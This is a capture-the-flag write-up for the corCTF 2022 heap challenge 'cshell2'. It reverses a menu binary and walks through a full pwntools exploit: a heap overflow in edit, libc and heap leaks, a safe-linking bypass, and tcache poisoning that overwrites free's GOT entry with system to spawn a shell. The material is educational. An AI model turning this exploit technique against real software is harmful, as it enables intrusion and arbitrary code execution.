---
title: "[corCTF 2022 - pwn] cshell2"
createdAt: 2022-08-07
tags: ["ctf", "corCTF", "2022", "heap", "nasm", "pwn"]
type: 'Writeups'
---

## Introduction

`cshell2` is a heap challenge I did during the [corCTF 2022](https://ctftime.org/event/1656) event. It was pretty classic so I will not describe a lot.
If you begin with heap challenges, I advice you to read [previous heap writeup](https://ret2school.github.io/tags/heap/).

## TL; DR

- Fill tcache.
- Heap overflow in `edit` on the `bio` field which allows to leak the address of the unsortedbin.
- Leak heap and defeat safe-linking to get an arbitrary write through tcache poisoning.
- Hiijack GOT entry of `free` to `system`.
- Call `free("/bin/sh")`.
- PROFIT

## Reverse Engineering

Let's take a look at the provided binary and libc:
```
$ ./libc.so.6 
GNU C Library (GNU libc) development release version 2.36.9000.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 12.1.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
Minimum supported kernel: 3.2.0
For bug reporting instructions, please see:
<https://www.gnu.org/software/libc/bugs.html>.
$ checksec --file cshell2
[*] '/home/nasm/Documents/pwn/corCTF/cshell2/cshell2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fb000)
    RUNPATH:  b'.'
```

A very recent libc plus a non PIE-based binary without `FULL RELRO`. Thus we could think to some GOT hiijacking stuff directly on the binary. Let's take a look at the `add` function:
```c
unsigned __int64 add()
{
  int idx_1; // ebx
  unsigned __int8 idx; // [rsp+Fh] [rbp-21h] BYREF
  size_t size; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  puts("Enter index: ");
  __isoc99_scanf("%hhu", &idx);
  puts("Enter size (1032 minimum): ");
  __isoc99_scanf("%lu", &size);
  if ( idx > 0xEu || size <= 0x407 || size_array[2 * idx] )
  {
    puts("Error with either index or size...");
  }
  else
  {
    idx_1 = idx;
    chunk_array[2 * idx_1] = (chunk_t *)malloc(size);
    size_array[2 * idx] = size;
    puts("Successfuly added!");
    puts("Input firstname: ");
    read(0, chunk_array[2 * idx], 8uLL);
    puts("Input middlename: ");
    read(0, chunk_array[2 * idx]->midName, 8uLL);
    puts("Input lastname: ");
    read(0, chunk_array[2 * idx]->lastName, 8uLL);
    puts("Input age: ");
    __isoc99_scanf("%lu", &chunk_array[2 * idx]->age);
    puts("Input bio: ");
    read(0, chunk_array[2 * idx]->bio, 0x100uLL);
  }
  return v4 - __readfsqword(0x28u);
}
```

It creates a chunk by asking several fields but nothing actually interesting there. Let's take a look at the `show` function:
```c
unsigned __int64 show()
{
  unsigned __int8 v1; // [rsp+7h] [rbp-9h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Enter index: ");
  __isoc99_scanf("%hhu", &v1);
  if ( v1 <= 0xEu && size_array[2 * v1] )
    printf(
      "Name\n last: %s first: %s middle: %s age: %d\nbio: %s",
      chunk_array[2 * v1]->lastName,
      chunk_array[2 * v1]->firstName,
      chunk_array[2 * v1]->midName,
      chunk_array[2 * v1]->age,
      chunk_array[2 * v1]->bio);
  else
    puts("Invalid index");
  return v2 - __readfsqword(0x28u);
}
```
It prints a chunk only if it's allocated (size entry initialized in the size array) and if the index is right.
Then the `delete` function:
```c
unsigned __int64 delete()
{
  unsigned __int8 v1; // [rsp+7h] [rbp-9h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Enter index: ");
  __isoc99_scanf("%hhu", &v1);
  if ( v1 <= 0xEu && size_array[2 * v1] )
  {
    free(chunk_array[2 * v1]);
    size_array[2 * v1] = 0LL;
    puts("Successfully Deleted!");
  }
  else
  {
    puts("Either index error or trying to delete something you shouldn't be...");
  }
  return v2 - __readfsqword(0x28u);
}
```
Quite common `delete` handler, it prevents double free.
The vulnerability is in the `edit` function:
```c
unsigned __int64 edit()
{
  unsigned __int8 idx; // [rsp+7h] [rbp-9h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Enter index: ");
  __isoc99_scanf("%hhu", &idx);
  if ( idx <= 0xEu && size_array[2 * idx] )
  {
    puts("Input firstname: ");
    read(0, chunk_array[2 * idx], 8uLL);
    puts("Input middlename: ");
    read(0, chunk_array[2 * idx]->midName, 8uLL);
    puts("Input lastname: ");
    read(0, chunk_array[2 * idx]->lastName, 8uLL);
    puts("Input age: ");
    __isoc99_scanf("%lu", &chunk_array[2 * idx]->age);
    printf("Input bio: (max %d)\n", size_array[2 * idx] - 32LL);
    read(0, chunk_array[2 * idx]->bio, size_array[2 * idx] - 32LL);
    puts("Successfully edit'd!");
  }
  return v2 - __readfsqword(0x28u);
}
```
It reads `size_array[2 * idx] - 32LL` bytes into a `0x100`-sized buffer which leads to a heap overflow.

## Exploitation

There is no actual issue, we can allocate whatever chunk bigger than `0x407`, the only fancy thing we have to do would be to defeat safe-linking to get an arbitrary write with a tcache poisoning attack on the `0x410` tcache bin. Here is the attack I led against the challenge but that's not the most optimized.

The plan is to:
- Allocate two `0x408`-sized chunks : pivot and victim, in order to easily get later libc leak.
- Allocate 9 more chunks and then fill the `0x410` tcachebin with them (with only 7 of them).
- Delete `victim` and overflow pivot up to the next free pointer of `victim` to get a libc leak.
- Allocate a `0x408`-sized chunk to get the `8`-th chunk (within `chunk_array`) which is on the top of the bin.
- Leak the heap same way as for libc, but we have to defeat safe-linking.
- Delete the `9`-th chunk to put it in the tcachebin at the first position.
- Then we can simply `edit` chunk `8` and overflow over chunk `9` to poison its next `fp` to hiijack it toward the GOT entry of `free`.
- Pop chunk `9` from the freelist and then request another the target memory area : the GOT entry of `free`.
- Write `system` into the GOT entry of `free`.
- Free whatever chunk for which `//bin/sh` is written at the right begin.
- PROFIT.

To understand the attack process I'll show the heap state at certain part of the attack.

## Libc / heap leak

First we have to fill the tcache. We allocate a chunk right after `chunk0` we do not put into the tcache to be able to put it in the unsortedbin to make appear unsortedbin's address:
```py
add(0, 1032, b"//bin/sh\x00", b"", b"", 1337, b"") # pivot
add(1, 1032, b"", b"", b"", 1337, b"") # victim

for i in range(2, 7+2 + 2):
    add(i, 1032, b"", b"", b"", 1337, b"")

for i in range(2, 7+2):
    delete(i)

delete(1)
edit(0, b"", b"", b"", 1337, b"Y"*(1032 - 64 + 7))

show(0)
io.recvuntil(b"Y"*(1032 - 64 + 7) + b"\n")
libc.address = pwn.u64(io.recvuntil(b"1 Add\n")[:-6].ljust(8, b"\x00")) - 0x1c7cc0
pwn.log.info(f"libc: {hex(libc.address)}")

# Heap state:
"""
0x1de1290	0x0000000000000000	0x0000000000000411	................ [chunk0]
0x1de12a0	0x68732f6e69622f0a	0x0000000000000a0a	./bin/sh........
0x1de12b0	0x000000000000000a	0x0000000000000539	........9.......
0x1de12c0	0x0000000000000000	0x0000000000000000	................
0x1de12d0	0x0000000000000000	0x0000000000000000	................
0x1de12e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de12f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1300	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1310	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1320	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1330	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1340	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1350	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1360	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1370	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1380	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1390	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de13a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de13b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de13c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de13d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de13e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de13f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1400	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1410	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1420	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1430	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1440	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1450	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1460	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1470	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1480	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1490	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de14a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de14b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de14c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de14d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de14e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de14f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1500	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1510	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1520	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1530	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1540	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1550	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1560	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1570	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1580	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1590	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de15a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de15b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de15c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de15d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de15e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de15f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1600	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1610	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1620	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1630	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1640	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1650	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1660	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1670	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1680	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de1690	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x1de16a0	0x5959595959595959	0x0a59595959595959	YYYYYYYYYYYYYYY.	 <-- unsortedbin[all][0] [chunk1]
0x1de16b0	0x00007f34f64c3cc0	0x00007f34f64c3cc0	.<L.4....<L.4...
"""
```

Then let's get a heap leak, we request back from the tcache the 8-th chunk, we free the `9`-th chunk that is allocated right after the `8`-th to be able to leak its next free pointer same way as for the libc previously. Plus we have to defeat safe-linking. To understand the defeat of safe-linking I advice you to read [this](https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation). It ends up to the `decrypt_pointer` function that makes use of known parts of the encrypted `fp` to decrypt the whole pointer. I didn't code the function by myself, too lazy for that, code comes from the [AeroCTF heap-2022 writeup](https://github.com/AeroCTF/aero-ctf-2022/blob/main/tasks/pwn/heap-2022/solution/sploit.py#L44).
```py
def decrypt_pointer(leak: int) -> int:
    parts = []

    parts.append((leak >> 36) << 36)
    parts.append((((leak >> 24) & 0xFFF) ^ (parts[0] >> 36)) << 24)
    parts.append((((leak >> 12) & 0xFFF) ^ ((parts[1] >> 24) & 0xFFF)) << 12)

    return parts[0] | parts[1] | parts[2]

add(11, 1032, b"", b"", b"", 1337, b"")

delete(9)
edit(11, b"", b"", b"", 1337, b"X"*(1032 - 64 + 7))

show(11)
io.recvuntil(b"X"*(1032 - 64 + 7) + b"\n")
heap = decrypt_pointer(pwn.u64(io.recvuntil(b"1 Add\n")[:-6].ljust(8, b"\x00"))) - 0x1000
pwn.log.info(f"heap: {hex(heap)}")

# Heap state

"""
0x13f6310	0x0000000000000000	0x0000000000000411	................ [chunk8]
0x13f6320	0x00000000013f4c0a	0x000000000000000a	.L?.............
0x13f6330	0x000000000000000a	0x0000000000000539	........9.......
0x13f6340	0x0000000000000000	0x0000000000000000	................
0x13f6350	0x0000000000000000	0x0000000000000000	................
0x13f6360	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX [chun8->bio]
0x13f6370	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6380	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6390	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f63a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f63b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f63c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f63d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f63e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f63f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6400	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6410	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6420	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6430	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6440	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6450	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6460	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6470	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6480	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6490	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f64a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f64b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f64c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f64d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f64e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f64f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6500	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6510	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6520	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6530	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6540	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6550	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6560	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6570	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6580	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6590	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f65a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f65b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f65c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f65d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f65e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f65f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6600	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6610	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6620	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6630	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6640	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6650	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6660	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6670	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6680	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6690	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f66a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f66b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f66c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f66d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f66e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f66f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6700	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6710	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x13f6720	0x5858585858585858	0x0a58585858585858	XXXXXXXXXXXXXXX.
0x13f6730	0x00000000013f4ce6	0xdc8340f7dfc0b0e1	.L?..........@..	 <-- tcachebins[0x410][0/7] [chunk9]
"""

```

Then here we are, we leaked both libc and heap base addresses. We just have to to tcache poisoning on `free`.

## Tcache poisoning + PROFIT

We overflow the `8`-th chunk to overwrite the next freepointer of `chunk9` that is stored at the HEAD of the `0x410` tcachebin. Then we got an arbitrary write.
We craft a nice header to be able to request it back from the tcache, and we encrypt the `next` with the location of the `chunk9` to pass safe-linking checks.

Given we hiijack GOT we initialized properly some pointers around to avoid segfaults. We do not get a write into the GOT entry of `free` cause it is unaliagned and `malloc` needs `16` bytes aligned next free pointer.
```py
edit(11, b"", b"", b"", 1337, b"X"*(1032 - 64) + pwn.p64(0x411) + pwn.p64(((heap + 0x2730) >> 12) ^ (exe.got.free - 0x8)))

# dumb
add(12, 1032, b"", b"", b"", 1337, b"")

io.sendlineafter(b"5 re-age user\n", b"1")
io.sendlineafter(b"index: \n", str(13).encode())
io.sendlineafter(b"Enter size (1032 minimum): \n", str(1032).encode())
io.sendafter(b"Input firstname: \n", pwn.p64(libc.address + 0xbbdf80))
io.sendafter(b"Input middlename: \n", pwn.p64(libc.sym.system))
io.sendafter(b"Input lastname: \n", pwn.p64(libc.address + 0x71ab0))
io.sendlineafter(b"Input age: \n", str(0).encode())
io.sendafter(b"Input bio: \n", pwn.p64(libc.address + 0x4cb40))

# Finally

delete(0)
io.sendline(b"cat flag.txt")
pwn.log.info(f"flag: {io.recvline()}")

io.interactive()
```

Here we are:
```
nasm@off:~/Documents/pwn/corCTF/cshell2$ python3 exploit.py REMOTE HOST=be.ax PORT=31667
[*] '/home/nasm/Documents/pwn/corCTF/cshell2/cshell2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fb000)
    RUNPATH:  b'.'
[*] '/home/nasm/Documents/pwn/corCTF/cshell2/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to be.ax on port 31667: Done
[*] libc: 0x7f1d388db000
[*] heap: 0x665000
[*] flag: b'corctf{m0nk3y1ng_0n_4_d3bugg3r_15_th3_b35T!!!}\n'
[*] Switching to interactive mode
$
```

## Appendices

Final exploit:
```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF('cshell2')
libc = pwn.ELF("./libc.so.6")

pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
pwn.context.timeout = 2000

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
continue
'''.format(**locals())

io = None


io = start()

def add(idx, size, firstname, midname, lastname, age, bio, l=True):
    io.sendlineafter(b"5 re-age user\n", b"1")
    io.sendlineafter(b"index: \n", str(idx).encode())
    io.sendlineafter(b"Enter size (1032 minimum): \n", str(size).encode())
    if l:
        io.sendlineafter(b"Input firstname: \n", firstname)
        io.sendlineafter(b"Input middlename: \n", midname)
        io.sendlineafter(b"Input lastname: \n", lastname)
        io.sendlineafter(b"Input age: \n", str(age).encode())
        io.sendlineafter(b"Input bio: \n", bio)

    else:
        io.sendafter(b"Input firstname: \n", firstname)
        io.sendafter(b"Input middlename: \n", midname)
        io.sendafter(b"Input lastname: \n", lastname)
        io.sendafter(b"Input age: \n", str(age).encode())
        io.sendafter(b"Input bio: \n", bio)



def show(idx):
    io.sendlineafter(b"5 re-age user\n", b"2")
    io.sendlineafter(b"index: ", str(idx).encode())

def delete(idx):
    io.sendlineafter(b"5 re-age user\n", b"3")
    io.sendlineafter(b"index: ", str(idx).encode())

def edit(idx, firstname, midname, lastname, age, bio):
    io.sendlineafter(b"5 re-age user\n", b"4")
    io.sendlineafter(b"index: ", str(idx).encode())
    
    io.sendlineafter(b"Input firstname: \n", firstname)
    io.sendlineafter(b"Input middlename: \n", midname)
    io.sendlineafter(b"Input lastname: \n", lastname)
    io.sendlineafter(b"Input age: \n", str(age).encode())
    io.sendlineafter(b")\n", bio)

def decrypt_pointer(leak: int) -> int:
    parts = []

    parts.append((leak >> 36) << 36)
    parts.append((((leak >> 24) & 0xFFF) ^ (parts[0] >> 36)) << 24)
    parts.append((((leak >> 12) & 0xFFF) ^ ((parts[1] >> 24) & 0xFFF)) << 12)

    return parts[0] | parts[1] | parts[2]

add(0, 1032, b"//bin/sh\x00", b"", b"", 1337, b"")
add(1, 1032, b"", b"", b"", 1337, b"")

for i in range(2, 7+2 + 2):
    add(i, 1032, b"", b"", b"", 1337, b"")

for i in range(2, 7+2):
    delete(i)

delete(1)
edit(0, b"", b"", b"", 1337, b"Y"*(1032 - 64 + 7))

show(0)
io.recvuntil(b"Y"*(1032 - 64 + 7) + b"\n")
libc.address = pwn.u64(io.recvuntil(b"1 Add\n")[:-6].ljust(8, b"\x00")) - 0x1c7cc0
pwn.log.info(f"libc: {hex(libc.address)}")

add(11, 1032, b"", b"", b"", 1337, b"")

delete(9)

edit(11, b"", b"", b"", 1337, b"X"*(1032 - 64 + 7))

show(11)
io.recvuntil(b"X"*(1032 - 64 + 7) + b"\n")
heap = decrypt_pointer(pwn.u64(io.recvuntil(b"1 Add\n")[:-6].ljust(8, b"\x00"))) - 0x1000
pwn.log.info(f"heap: {hex(heap)}")

environ = libc.address + 0xbe02f0

edit(11, b"", b"", b"", 1337, b"X"*(1032 - 64) + pwn.p64(0x411) + pwn.p64(((heap + 0x2730) >> 12) ^ (0x404010)))

# dumb
add(12, 1032, b"", b"", b"", 1337, b"")

#===

io.sendlineafter(b"5 re-age user\n", b"1")
io.sendlineafter(b"index: \n", str(13).encode())
io.sendlineafter(b"Enter size (1032 minimum): \n", str(1032).encode())
io.sendafter(b"Input firstname: \n", pwn.p64(libc.address + 0xbbdf80))
io.sendafter(b"Input middlename: \n", pwn.p64(libc.sym.system))
io.sendafter(b"Input lastname: \n", pwn.p64(libc.address + 0x71ab0))
io.sendlineafter(b"Input age: \n", str(0).encode())
io.sendafter(b"Input bio: \n", pwn.p64(libc.address + 0x4cb40))

delete(0)
io.sendline(b"cat flag.txt")
pwn.log.info(f"flag: {io.recvline()}")

io.interactive()
```